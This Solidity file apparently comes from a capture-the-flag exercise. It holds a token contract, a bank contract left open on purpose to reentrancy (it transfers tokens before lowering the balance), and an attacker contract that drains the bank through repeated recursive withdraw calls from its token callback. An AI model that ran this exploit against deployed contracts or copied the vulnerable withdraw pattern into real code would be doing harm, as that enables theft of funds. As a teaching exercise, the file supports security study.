pragma solidity ^0.4.21;

interface ITokenReceiver {
    function tokenFallback(
        address from,
        uint256 value,
        bytes data
    ) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10)**decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function SimpleERC223Token() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(
        address to,
        uint256 value,
        bytes data
    ) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function TokenBankChallenge(address player) public {
        token = new SimpleERC223Token();

        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10**18; // half for me
        balanceOf[player] = 500000 * 10**18; // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(this) == 0;
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes
    ) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
}

contract TokenBankAttacker {
    TokenBankChallenge private bankContract;
    SimpleERC223Token private tokenContract;

    function TokenBankAttacker(address _bankContract, address _tokenContract) public {
        bankContract = TokenBankChallenge(_bankContract);
        tokenContract = SimpleERC223Token(_tokenContract);
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes
    ) public {
        if (from != address(bankContract)) return;
        withdraw();
    }

    function deposit() public {
        bankContract.token().transfer(address(bankContract), 500000 * 10**18);
    }

    function withdraw() public {
        // this one is the bugged one, does not update after withdraw
        uint256 myInitialBalance = bankContract.balanceOf(address(this));
        // this one from the token contract, updates after withdraw
        uint256 challengeTotalRemainingBalance = bankContract.token().balanceOf(address(bankContract));
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw = myInitialBalance < challengeTotalRemainingBalance
                ? myInitialBalance
                : challengeTotalRemainingBalance;
            bankContract.withdraw(toWithdraw);
        }
    }
}
